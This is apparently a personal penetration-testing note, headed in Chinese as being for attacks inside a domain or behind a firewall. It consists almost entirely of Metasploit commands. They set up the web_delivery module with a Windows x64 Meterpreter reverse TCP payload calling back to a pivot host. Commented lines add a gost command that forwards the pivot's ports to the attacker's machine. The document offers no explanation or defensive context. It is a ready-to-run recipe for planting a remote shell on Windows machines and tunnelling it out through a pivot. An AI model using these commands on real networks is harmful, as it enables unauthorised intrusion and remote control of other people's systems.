# 域内/防火墙内攻击

use exploit/multi/script/web_delivery
set target 2
set payload windows/x64/meterpreter/reverse_tcp
set lport 1234
# 跳板机ip
set lhost 192.168.93.100
# set srvhost 0.0.0.0
# set srvport 8080
run

# 跳板机转发端口
# gost -L=tcp://:1234/192.168.50.80:1234 -L=tcp://:8080/192.168.50.80:8080
# 攻击机Ip: 192.168.50.80 
